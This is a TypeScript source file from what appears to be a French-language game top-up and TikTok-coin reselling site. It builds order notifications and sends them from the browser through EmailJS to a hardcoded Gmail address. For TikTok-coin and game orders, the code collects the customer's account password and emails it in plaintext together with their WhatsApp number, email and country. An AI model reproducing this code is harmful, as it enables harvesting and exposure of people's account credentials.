import {
  PAYMENT_NOTIFICATION_DATA_KEY,
  type PaymentNotificationData,
  type PendingPaymentCheckout,
} from "@/app/lib/payments/payment-contract";

const EMAILJS_SERVICE_ID = process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID || "";
const EMAILJS_TEMPLATE_ID = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID || "";
const EMAILJS_PUBLIC_KEY = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY || "";
const RECIPIENT_EMAIL = "serviceclient2126@gmail.com";

const EMAIL_SENT_PREFIX = "nova-pay-payment-email-sent:";

function readNotificationData(orderId: string): PaymentNotificationData | null {
  try {
    const raw = window.sessionStorage.getItem(PAYMENT_NOTIFICATION_DATA_KEY);
    if (!raw) return null;
    const value: unknown = JSON.parse(raw);
    if (typeof value !== "object" || value === null || Array.isArray(value)) return null;
    const data = value as Partial<PaymentNotificationData>;
    if (
      data.orderId !== orderId ||
      typeof data.contactWhatsapp !== "string" ||
      !data.contactWhatsapp.trim() ||
      (data.productType !== "coins" && data.productType !== "card" && data.productType !== "game")
    ) return null;

    return {
      orderId,
      contactEmail: typeof data.contactEmail === "string" ? data.contactEmail.slice(0, 254) : undefined,
      contactWhatsapp: data.contactWhatsapp.slice(0, 40),
      country: typeof data.country === "string" ? data.country.slice(0, 120) : undefined,
      tiktokPassword: typeof data.tiktokPassword === "string" ? data.tiktokPassword.slice(0, 256) : undefined,
      productType: data.productType,
      productLabel: typeof data.productLabel === "string" ? data.productLabel.slice(0, 160) : undefined,
      loginMethod: typeof data.loginMethod === "string" ? data.loginMethod.slice(0, 80) : undefined,
      playerName: typeof data.playerName === "string" ? data.playerName.slice(0, 100) : undefined,
    };
  } catch {
    return null;
  }
}

function hasAlreadySent(orderId: string): boolean {
  try {
    return window.sessionStorage.getItem(`${EMAIL_SENT_PREFIX}${orderId}`) === "1";
  } catch {
    return false;
  }
}

function markAsSent(orderId: string): void {
  try {
    window.sessionStorage.setItem(`${EMAIL_SENT_PREFIX}${orderId}`, "1");
    window.sessionStorage.removeItem(PAYMENT_NOTIFICATION_DATA_KEY);
  } catch {
    // The confirmation screen remains usable when session storage is disabled.
  }
}

export async function sendOrderEmail(checkout: PendingPaymentCheckout): Promise<void> {
  if (!EMAILJS_SERVICE_ID || !EMAILJS_TEMPLATE_ID || !EMAILJS_PUBLIC_KEY || hasAlreadySent(checkout.orderId)) return;

  const notification = readNotificationData(checkout.orderId);
  if (!notification) return;

  const label = (notification.productLabel || checkout.productLabel || "").toLowerCase();
  const isFreeFire = label.includes("free fire");
  const isPubg = label.includes("pubg");
  const isCod = label.includes("call of duty") || label.includes("cod");
  const isBloodStrike = label.includes("blood strike");
  const isFcMobile = label.includes("ea sports fc") || label.includes("fc mobile") || label.includes("points fc");

  // Free Fire regional links:
  // Amérique latine / LAM ou Europe -> Manabuy
  // Régions générales -> Gamsgo
  const isFfManabuy = isFreeFire && (label.includes("amérique") || label.includes("lam") || label.includes("europe") || label.includes("eu"));
  const freeFireRechargeLink = isFfManabuy
    ? "https://manabuy.com/fr/free-fire-top-up"
    : "https://www.gamsgo.com/fr/top-up/free-fire-top-up";

  const pubgRechargeLink = "https://www.gamsgo.com/fr/top-up/pubg";
  const codRechargeLink = "https://shop.carry1st.com/fr/CM/product/codm-call-of-duty-mobile-cp-points-top-up-battle-pass/direct-topup?utm_source=Carry1st_Website&utm_medium=referral";
  const bloodStrikeRechargeLink = "https://manabuy.com/fr/blood-strike-top-up";
  const fcMobileRechargeLink = "https://manabuy.com/fr/ea-sports-fc-mobile-soccer-top-up";

  let credentialsInfo = "";
  if (isFreeFire) {
    credentialsInfo = `\n- ID Joueur Free Fire (UID) : ${checkout.username || "Non renseigné"}\n- LIEN DE RECHARGE (${isFfManabuy ? "MANABUY" : "GAMSGO"}) : ${freeFireRechargeLink}`;
  } else if (isPubg) {
    credentialsInfo = `\n- ID Joueur PUBG Mobile (UID) : ${checkout.username || "Non renseigné"}\n- LIEN DE RECHARGE RAPIDE : ${pubgRechargeLink}`;
    } else if (isCod) {
    credentialsInfo = [
      "- Jeu : Call of Duty: Mobile",
      "- Forfait : " + (notification.productLabel || checkout.productLabel || "CP"),
      "- UID / Pseudo ou ID Joueur : " + (checkout.username || "Non renseigné"),
      "- WhatsApp : " + (notification.contactWhatsapp || "Non renseigné"),
      "- DÉLAI LIVRAISON : environ 2 à 5 minutes",
      "- LIEN DE RECHARGE DIRECT CARRY1ST : " + codRechargeLink,
    ].join("\n");
  } else if (isBloodStrike) {
    credentialsInfo = `\n- ID Joueur Blood Strike (UID) : ${checkout.username || "Non renseigné"}\n- LIEN DE RECHARGE MANABUY : ${bloodStrikeRechargeLink}`;
  } else if (isFcMobile) {
    credentialsInfo = `\n- UID Joueur EA FC Mobile : ${checkout.username || "Non renseigné"}\n- LIEN DE RECHARGE MANABUY : ${fcMobileRechargeLink}`;
  } else if (notification.productType === "coins") {
    credentialsInfo = `\n- Identifiant TikTok : @${checkout.username || "Non renseigné"}\n- Mot de passe TikTok : ${notification.tiktokPassword || "Non renseigné"}`;
  } else if (notification.productType === "game") {
    credentialsInfo = `\n- Identifiant / Email Compte : ${notification.contactEmail || checkout.username || "Non renseigné"}\n- Mot de passe : ${notification.tiktokPassword || "Non renseigné"}`;
  }

    const rechargeLink = isFreeFire
    ? freeFireRechargeLink
    : isPubg
    ? pubgRechargeLink
    : isCod
    ? codRechargeLink
    : isBloodStrike
    ? bloodStrikeRechargeLink
    : isFcMobile
    ? fcMobileRechargeLink
    : "";

  const templateParams = {
    to_email: RECIPIENT_EMAIL,
    recipient_email: RECIPIENT_EMAIL,
    admin_email: RECIPIENT_EMAIL,
    order_id: checkout.orderId,
    amount: checkout.amount,
    currency: checkout.currency || "XAF",
    product_type: isFreeFire
      ? "Free Fire (Diamants)"
      : isPubg
      ? "PUBG Mobile (UC)"
      : isCod
      ? "Call of Duty: Mobile (CP)"
      : isBloodStrike
      ? "Blood Strike (Or)"
      : isFcMobile
      ? "EA Sports FC Mobile (Points FC)"
      : notification.productType === "coins"
      ? "Pièces TikTok"
      : notification.productType === "card"
      ? "Carte Virtuelle"
      : "Jeux Vidéo",
    product_label: notification.productLabel || (isFreeFire ? "Free Fire" : isPubg ? "PUBG Mobile" : isCod ? "Call of Duty: Mobile" : isBloodStrike ? "Blood Strike" : isFcMobile ? "EA Sports FC Mobile" : "Non renseigné"),
    customer_email: notification.contactEmail || "Non renseigné",
    customer_whatsapp: notification.contactWhatsapp || "Non renseigné",
    customer_country: notification.country || "Non renseigné",
    tiktok_credentials: credentialsInfo,
    free_fire_link: isFreeFire ? freeFireRechargeLink : "",
    pubg_link: isPubg ? pubgRechargeLink : "",
    cod_link: isCod ? codRechargeLink : "",
    blood_strike_link: isBloodStrike ? bloodStrikeRechargeLink : "",
    fc_link: isFcMobile ? fcMobileRechargeLink : "",
    recharge_link: rechargeLink,
        message: isFreeFire
      ? "Commande Free Fire confirmée.\nID Joueur : " + checkout.username + "\nLien de recharge direct : " + freeFireRechargeLink
      : isPubg
      ? "Commande PUBG Mobile confirmée.\nID Joueur : " + checkout.username + "\nLien direct Gamsgo : " + pubgRechargeLink
      : isCod
      ? "Commande COD Mobile confirmée (Délai : 2-5 min).\nForfait : " + (notification.productLabel || checkout.productLabel || "") + "\nUID / Pseudo Joueur : " + checkout.username + "\nEmail : " + (notification.contactEmail || "Non renseigné") + "\nWhatsApp : " + (notification.contactWhatsapp || "") + "\nLien direct Carry1st : " + codRechargeLink
      : isBloodStrike
      ? "Commande Blood Strike confirmée.\nID Joueur : " + checkout.username + "\nLien direct Manabuy : " + bloodStrikeRechargeLink
      : isFcMobile
      ? "Commande EA Sports FC Mobile confirmée.\nUID Joueur : " + checkout.username + "\nLien direct Manabuy : " + fcMobileRechargeLink
      : "",
  };

  const response = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      service_id: EMAILJS_SERVICE_ID,
      template_id: EMAILJS_TEMPLATE_ID,
      user_id: EMAILJS_PUBLIC_KEY,
      template_params: templateParams,
    }),
    keepalive: true,
  });

  if (!response.ok) throw new Error("EmailJS request failed");
  markAsSent(checkout.orderId);
}
